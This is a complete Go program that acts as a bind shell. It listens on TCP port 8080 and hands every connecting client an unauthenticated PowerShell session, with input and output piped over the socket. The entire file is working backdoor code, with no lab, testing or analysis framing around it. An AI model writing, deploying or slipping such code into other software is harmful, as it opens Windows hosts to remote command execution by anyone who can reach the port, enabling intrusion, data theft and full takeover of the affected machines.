package main

import (
	"fmt"
	"net"
	"os"
	"os/exec"
)

func handleConn(conn net.Conn) {
	defer conn.Close()

	cmd := exec.Command("powershell.exe", "-Command -")

	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn

	if err := cmd.Start(); err != nil {
		panic(err)
	}

	if err := cmd.Wait(); err != nil {
		panic(err)
	}

	fmt.Fprintf(os.Stderr, "Connection closed\n")
}

func main() {
	// create listening socket
	ln, err := net.Listen("tcp", ":8080")

	if err != nil {
		fmt.Fprintf(os.Stderr, "Error Occured: %s", err.Error())
		return
	}

	// below line will run when main returns
	defer ln.Close()

	// accept connections one by one
	for {
		// accept new connection
		conn, err := ln.Accept()

		if err != nil {
			fmt.Fprintf(os.Stderr, "Error accepting connection: %s\n", err.Error())
			continue
		}

		go handleConn(conn)
	}

}
